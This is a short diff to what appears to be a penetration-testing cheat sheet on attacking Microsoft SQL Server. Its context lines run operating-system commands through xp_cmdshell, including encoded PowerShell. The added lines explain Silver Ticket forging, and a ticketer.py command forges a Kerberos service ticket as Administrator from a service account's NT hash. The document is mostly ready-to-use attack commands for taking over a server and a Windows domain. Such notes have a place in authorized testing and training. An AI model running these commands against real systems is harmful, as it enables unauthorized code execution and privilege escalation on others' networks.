@@ -146,8 +146,12 @@ RECONFIGURE;
 exec xp_cmdshell 'whoami'                             
 exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
 ```
-# Forge Ticket
-We are forging ticket to get the administrator shell in the mssql server. so we can run xp_cmdshell.
+# Forge Ticket (Silver Ticket 🥈)
+- We are forging ticket to get the administrator shell in the mssql server. so we can run xp_cmdshell.
+- Forged using a specific service account hash.
+- Grants access to only that specific service
+- Like having a key to one room, not the whole building
+
 ```bash
 ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -groups 1105 -user-id 500 Administrator
 ```
